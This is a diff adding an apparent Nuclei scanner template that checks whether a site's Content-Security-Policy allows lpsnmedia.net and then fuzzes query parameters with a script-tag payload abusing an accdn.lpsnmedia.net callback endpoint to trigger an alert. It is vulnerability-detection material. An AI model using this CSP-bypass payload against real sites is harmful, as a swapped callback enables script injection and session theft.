@@ -1,0 +1,55 @@
+id: lpsnmedia-accdn-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - LPSN Media
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,lpsnmedia-accdn,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "lpsnmedia.net"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: lpsnmedia_accdn_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "lpsnmedia_accdn_csp_xss == true"
+# digest: 4a0a0047304502201c469cee37ea05204d6e0d01d5b43de7a761428a1bf345f65ed8145bff3252c9022100d0989c72a61523c52f38315006903e490a1d5497d6a267dd98e06253b01fcf48:922c64590222798bb761d5b6d8e72950
